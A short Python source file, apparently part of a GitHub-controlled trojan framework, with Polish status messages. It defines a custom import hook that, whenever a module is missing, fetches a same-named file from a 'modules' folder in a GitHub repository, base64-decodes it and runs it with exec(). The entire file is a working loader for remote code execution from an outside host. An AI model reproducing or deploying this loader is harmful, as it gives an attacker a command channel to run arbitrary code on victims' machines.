import github3
import base64
import importlib
import sys


from gitconnect import github_connect, get_file_contents


class GitImporter:
    def __init__(self):
        self.current_module_code = ""


    def find_module(self, name, path=None):
        print("[*] Próba pobrania %s" % name)
        self.repo = github_connect()

        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self


    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None,
                                               origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module